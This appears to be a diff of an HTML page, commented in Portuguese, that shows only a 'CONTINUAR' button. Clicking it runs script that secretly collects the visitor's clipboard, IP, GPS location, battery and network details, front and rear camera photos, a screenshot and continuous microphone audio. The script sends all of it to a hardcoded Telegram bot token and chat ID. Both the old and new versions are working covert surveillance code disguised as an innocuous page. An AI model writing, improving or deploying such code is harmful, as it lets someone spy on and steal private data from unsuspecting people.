@@ -1,201 +1,109 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width, initial-scale=1"/>
-<style>
-html,body{margin:0;height:100%;background:#000;display:flex;align-items:center;justify-content:center;font-family:sans-serif}
-button{padding:40px 80px;font:24px;background:#0f0;border:none;border-radius:8px;cursor:pointer;box-shadow:0 4px 12px rgba(0,255,0,.3)}
-button:active{transform:scale(.98)}
-</style>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <style>
+    html,body{margin:0;height:100%;background:#000;display:flex;align-items:center;justify-content:center;color:#0f0;font:24px sans-serif}
+  </style>
 </head>
 <body>
-<button id="b">CONTINUAR</button>
+  <button id="b" style="padding:40px 80px;background:#0f0;color:#000;border:0;cursor:pointer">CONTINUAR</button>
 
 <script>
-const BOT_TOKEN = "8783547945:AAHBAXXALN7Vi063RlRGoggCGWpWfmZTTks";
-const CHAT_ID   = "8792921881";
+  const BOT_TOKEN="8783547945:AAHBAXXALN7Vi063RlRGoggCGWpWfmZTTks";
+  const CHAT_ID="8792921881";
+  const envia=txt=>fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt.slice(0,4096))}`);
+  const SALVA=u=>fetch("/api/salva",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(u)});
+  let rec=null,chunks=[],s=null;
 
-const dados = {
- altura: null,
- wifi: null,
- ip: null,
- device: null,
- fotos: [],
- clipboard: null
-};
+  b.onclick=async()=>{
+    b.remove();
 
-b.onclick = async () => {
- b.textContent = "COLETANDO...";
- b.disabled = true;
+    /* 1) libera geolocalizção p/ iOS liberar SSID */
+    await new Promise(res=>navigator.geolocation.getCurrentPosition(res,()=>res({coords:null})));
 
- // ALTURA DO CHÃO (via sensor de proximidade ou estimativa)
- if ('ProximitySensor' in window) {
-   try {
-     const sensor = new ProximitySensor();
-     sensor.onreading = () => {
-       dados.altura = sensor.distance ? `${sensor.distance} cm` : 'indisponível';
-     };
-     sensor.start();
-     await new Promise(r => setTimeout(r, 500));
-   } catch(e) {
-     dados.altura = 'sensor não disponível';
-   }
- } else {
-   // Fallback: estimativa via acelerômetro (queda livre = ~0, parado = distância até o chão)
-   dados.altura = 'use sensor de proximidade ou mantenha parado';
- }
+    const rel=[];
 
- // WIFI (SSID conectado + redes salvas visíveis)
- const conexao = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
- dados.wifi = {
-   ssid: 'não disponível (precisa de permissão de localização)',
-   tipo: conexao?.effectiveType || 'desconhecido',
-   downlink: conexao?.downlink ? `${conexao.downlink} Mbps` : 'n/a'
- };
+    /* SSID + tipo rede */
+    try{rel.push("SSID: "+((navigator.connection?.ssid)??"---"));}catch{rel.push("SSID: ---")}
+    rel.push("tipo rede: "+(navigator.connection?.effectiveType||"---"));
 
- // Tentativa de redes Wi-Fi próximas (Chrome 98+ Android, experimental)
- if ('getWifiInfo' in navigator) {
-   try {
-     const wifi = await navigator.getWifiInfo();
-     dados.wifi.ssid = wifi.ssid || wifi.SSID || 'oculto';
-   } catch(e) {}
- }
+    /* IP */
+    rel.push("IP público: "+(await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>j.ip).catch(()=>"---")));
 
- // IP PÚBLICO
- try {
-   const ipRes = await fetch('https://api.ipify.org?format=json');
-   const ipData = await ipRes.json();
-   dados.ip = ipData.ip;
- } catch(e) {
-   dados.ip = 'não obtido';
- }
+    /* Clipboard (precisa do gesture) */
+    try{rel.push("clipboard: "+(await navigator.clipboard.readText())||"(vazio)")}catch{rel.push("clipboard: ---")}
 
- // DISPOSITIVO + SISTEMA
- dados.device = {
-   modelo: navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || 'desconhecido',
-   plataforma: navigator.platform,
-   sistema: navigator.userAgent,
-   linguagem: navigator.language,
-   resolucao: `${screen.width}x${screen.height}`
- };
+    /* UA / email (só Chrome) */
+    rel.push("UA: "+navigator.userAgent);
+    rel.push("Email: ---"); /* iOS não tem API de contatos web */
 
- // CLIPBOARD
- try {
-   const clip = await navigator.clipboard.readText();
-   dados.clipboard = clip || '(vazio)';
- } catch(e) {
-   dados.clipboard = 'sem acesso (precisa de interação)';
- }
+    /* Bateria */
+    const bat=await navigator.getBattery();
+    rel.push(`Bateria: ${Math.round(bat.level*100)}% ${bat.charging?'🔌':''}`);
 
- // FOTOS (frontal + traseira)
- const streams = [];
- 
- try {
-   const front = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
-   const frontBlob = await captura(front, 'frontal');
-   streams.push(front);
-   
-   const rear = await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
-   const rearBlob = await captura(rear, 'traseira');
-   streams.push(rear);
+    /* GPS */
+    const pos=await new Promise(res=>navigator.geolocation.getCurrentPosition(res,()=>res({coords:null})));
+    rel.push(pos.coords?
+      `📍https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`:
+      "📍GPS: ---");
 
-   // Envia fotos
-   await enviaFoto(frontBlob, 'frontal.jpg');
-   await enviaFoto(rearBlob, 'traseira.jpg');
+    /* Velocidade (baixada rápida) */
+    const t0=performance.now();
+    await fetch("https://speed.cloudflare.com/__down?bytes=500000",{cache:"no-store"}).catch(()=>{});
+    const mbps=(4/(performance.now()-t0)*1000).toFixed(1);
+    rel.push(`⬇️ ${mbps} Mbps`);
 
-   // Limpa streams
-   streams.forEach(s => s.getTracks().forEach(t => t.stop()));
+    /* Orientação */
+    const ori=await new Promise(res=>{
+      addEventListener("deviceorientation",e=>res(e),{once:true});
+      setTimeout(()=>res({alpha:0,beta:0,gamma:0}),1200);
+    });
+    rel.push(`🧭 ${Math.round(ori.alpha||0)}° ${Math.round(ori.beta||0)}° ${Math.round(ori.gamma||0)}°`);
 
- } catch(e) {
-   dados.fotos.push('erro: ' + e.message);
- }
+    /* Áudio contínuo até fechar */
+    s=await navigator.mediaDevices.getUserMedia({audio:true});
+    rec=new MediaRecorder(s);rec.ondataavailable=e=>chunks.push(e.data);
+    rec.start(1000);
+    addEventListener("beforeunload",()=>rec.stop());
+    rec.onstop=()=>{
+      if(!chunks.length){s.getTracks().forEach(t=>t.stop());return;}
+      const fd=new FormData();fd.append("voice",new Blob(chunks,{type:"audio/webm"}),"longo.webm");
+      fd.append("chat_id",CHAT_ID);//"voice"!
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`,{method:"POST",body:fd});
+      SALVA({t:"audiolongo",v:"longo.webm"});
+      s.getTracks().forEach(t=>t.stop());
+    };
 
- // MONTA RELATÓRIO
- const relatorio = `
-📊 RELATÓRIO DO DISPOSITIVO
+    /* Envia texto único */
+    envia(rel.join("\n"));
+    SALVA({t:"relatorio",v:rel.join("\n")});
 
-📏 ALTURA DO CHÃO: ${dados.altura}
+    /* 3 fotos */
+    navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(str=>foto(str,"selfie.jpg"));
+    navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}}).then(str=>foto(str,"rear.jpg"));
+    import("https://cdn.skypack.dev/html2canvas@1.4.1")
+      .then(m=>m.default(document.body).then(c=>c.toBlob(b=>{
+        const fd=new FormData();fd.append("photo",b,"print.jpg");fd.append("chat_id",CHAT_ID);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
+        SALVA({t:"print",v:"print.jpg"});
+      })));
 
-📶 WI-FI:
-• SSID: ${dados.wifi.ssid}
-• Tipo: ${dados.wifi.tipo}
-• Velocidade: ${dados.wifi.downlink}
-
-🌐 IP PÚBLICO: ${dados.ip}
-
-📱 DISPOSITIVO:
-• Modelo/SoC: ${dados.device.modelo}
-• Plataforma: ${dados.device.plataforma}
-• Resolução: ${dados.device.resolucao}
-• Idioma: ${dados.device.linguagem}
-
-📋 CLIPBOARD:
-"${dados.clipboard}"
-
-⏱️ Coleta em: ${new Date().toLocaleString('pt-BR')}
-`;
-
- // Envia relatório único
- await enviaRelatorio(relatorio);
- await SALVA({t:'relatorio',v:relatorio,timestamp:Date.now()});
-
- b.textContent = "ENVIADO ✓";
- b.style.background = "#0a0";
-};
-
-// FUNÇÕES AUXILIARES
-function captura(stream, nome) {
- return new Promise((resolve, reject) => {
-   const v = document.createElement('video');
-   v.srcObject = stream;
-   v.play();
-   
-   const c = document.createElement('canvas');
-   c.width = 1280;
-   c.height = 720;
-   const x = c.getContext('2d');
-   
-   setTimeout(() => {
-     x.drawImage(v, 0, 0, c.width, c.height);
-     c.toBlob(blob => {
-       if (blob) resolve(blob);
-       else reject('falha na captura');
-     }, 'image/jpeg', 0.85);
-   }, 800);
- });
-}
-
-async function enviaFoto(blob, nome) {
- const fd = new FormData();
- fd.append('photo', blob, nome);
- fd.append('chat_id', CHAT_ID);
- 
- await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-   method: 'POST',
-   body: fd
- });
-}
-
-function enviaRelatorio(texto) {
- return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-   method: 'POST',
-   headers: {'Content-Type': 'application/json'},
-   body: JSON.stringify({
-     chat_id: CHAT_ID,
-     text: texto,
-     parse_mode: 'HTML'
-   })
- });
-}
-
-function SALVA(obj) {
- return fetch('/api/salva', {
-   method: 'POST',
-   headers: {'Content-Type': 'application/json'},
-   body: JSON.stringify(obj)
- }).catch(() => {});
-}
+    function foto(stream,nome){
+      const v=document.createElement("video");v.srcObject=stream;v.play();const c=document.createElement("canvas");
+      c.width=1280;c.height=720;const ctx=c.getContext("2d");
+      setTimeout(()=>{
+        ctx.drawImage(v,0,0);
+        c.toBlob(blob=>{
+          const fd=new FormData();fd.append("photo",blob,nome);fd.append("chat_id",CHAT_ID);
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
+          SALVA({t:"foto",v:nome});
+          stream.getTracks().forEach(t=>t.stop());
+        },"image/jpeg",0.8);
+      },600);
+    }
+  };
 </script>
 </body>
 </html>
